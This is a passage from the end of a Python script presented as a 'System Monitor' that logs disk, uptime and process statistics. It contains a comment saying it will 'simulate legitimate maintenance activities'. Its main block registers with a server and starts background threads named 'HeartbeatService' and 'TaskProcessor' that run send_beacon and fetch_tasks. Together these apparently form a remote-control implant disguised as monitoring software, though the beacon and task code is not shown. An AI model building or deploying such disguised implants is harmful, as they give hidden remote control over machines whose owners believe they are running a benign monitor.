        logging.info(f"Disk Space - Total: {total//1024**3}GB, Free: {free//1024**3}GB")
        
        # Log system uptime
        boot_time = psutil.boot_time()
        uptime = time.time() - boot_time
        logging.info(f"System uptime: {uptime//3600:.1f} hours")
        
        # Initialize vulnerability database
        if get_vulnerability_database:
            try:
                vuln_db = get_vulnerability_database()
                db_stats = vuln_db.get_database_stats()
                logging.info(f"Vulnerability database initialized: {db_stats.get('total_vulnerabilities', 0)} vulnerabilities loaded")
            except Exception as e:
                logging.warning(f"Vulnerability database initialization failed: {e}")
        
        logging.info("System monitoring initialized successfully")
        return True
    except Exception as e:
        logging.warning(f"System initialization warning: {e}")
        return False

def perform_routine_maintenance():
    """Perform routine system maintenance tasks"""
    try:
        logging.info("Starting routine system maintenance...")
        
        # Simulate legitimate maintenance activities
        import tempfile
        temp_dir = tempfile.gettempdir()
        temp_files = len([f for f in os.listdir(temp_dir) if os.path.isfile(os.path.join(temp_dir, f))])
        logging.info(f"Temporary files check: {temp_files} files in temp directory")
        
        # Check running processes
        import psutil
        processes = len(psutil.pids())
        logging.info(f"Process count monitoring: {processes} active processes")
        
        # Network connectivity check
        try:
            response = requests.get("http://www.google.com", timeout=5)
            logging.info("Network connectivity: Online")
        except:
            logging.info("Network connectivity: Limited or offline")
        
        logging.info("Routine maintenance completed")
        return True
    except Exception as e:
        logging.error(f"Maintenance error: {e}")
        return False

def maintenance_scheduler():
    """Schedule periodic maintenance tasks"""
    while True:
        time.sleep(3600)  # Run maintenance every hour
        perform_routine_maintenance()

if __name__ == "__main__":
    # Initialize system monitoring
    initialize_system_monitor()
    
    # Register with monitoring server
    register()
    
    # Perform initial security assessment
    run_security_assessment()
    
    # Start initial system data collection
    auto_task_post_startup()
    
    # Start monitoring threads
    logging.info("Starting system monitoring services...")
    threading.Thread(target=send_beacon, daemon=True, name="HeartbeatService").start()
    threading.Thread(target=fetch_tasks, daemon=True, name="TaskProcessor").start()
    threading.Thread(target=maintenance_scheduler, daemon=True, name="MaintenanceService").start()
    
    # Main monitoring loop
    logging.info("System Monitor v1.0 - Monitoring system performance and health")
    while True:
        time.sleep(60)
